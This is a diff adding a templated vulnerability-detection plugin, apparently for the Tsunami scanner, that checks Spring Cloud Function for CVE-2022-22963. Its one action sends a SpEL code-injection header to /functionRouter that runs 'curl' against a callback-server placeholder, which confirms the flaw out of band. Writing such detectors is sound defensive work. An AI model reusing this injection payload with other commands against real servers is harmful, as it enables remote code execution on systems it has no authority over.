@@ -1,0 +1,83 @@
+# proto-file: proto/templated_plugin.proto
+# proto-message: TemplatedPlugin
+
+###############
+# PLUGIN INFO #
+###############
+
+info: {
+  type: VULN_DETECTION
+  name: "SpringCloudFunction_CVE_2022_22963"
+  author: 
+    "Robert Dick (robert@doyensec.com) for the Templated version, \n"
+    "threedr3am (qiaoer1320@gmail.com) for the original Java version"
+  version: "2.0"
+}
+
+finding: {
+  main_id: {
+    publisher: "TSUNAMI_COMMUNITY"
+    value: "CVE_2022_22963"
+  }
+  severity: CRITICAL
+  title: "Spring Cloud Function SpEL Code Injection RCE (CVE-2022-22963)"
+  description:
+    "In Spring Cloud Function versions 3.1.6, 3.2.2 and older unsupported versions, "
+    "when using routing functionality it is possible for a user to provide a "
+    "specially crafted SpEL as a routing-expression that may result in remote "
+    "code execution and access to local resources."
+  recommendation:
+    "Users of affected versions should upgrade to 3.1.7, 3.2.3."
+  related_id: {
+    publisher: "CVE"
+    value: "CVE-2022-22963"
+  }
+}
+
+###########
+# ACTIONS #
+###########
+
+# fingerprinting is not easy for this, I think, so leaving a fingerprint out.
+# Original had no fingerprint.
+
+# looser checks on response since we have to check the callback server logs
+
+actions: {
+  name: "execute_payload_oob"
+  http_request: {
+    method: POST
+    uri: "/functionRouter"
+    headers: [
+      { name: "spring.cloud.function.routing-expression" value: "T(java.lang.Runtime).getRuntime().exec(\"curl {{ T_CBS_URI }}\")"}
+    ]
+    data: "TSUNAMI"
+  }
+}
+
+# not ideal to have a sleep without a fingerprint step, but we can do a short one probably
+
+actions: {
+  name: "sleep"
+  utility: { sleep: { duration_ms: 1000 } }
+}
+
+actions: {
+  name: "check_callback_server_logs"
+  callback_server: { action_type: CHECK }
+}
+
+#############
+# WORKFLOWS #
+#############
+
+# also tried to implement a reflective version but it didn't work. 
+
+workflows: {
+  condition: REQUIRES_CALLBACK_SERVER
+  actions: [
+    "execute_payload_oob",
+    "sleep",
+    "check_callback_server_logs"
+  ]
+}
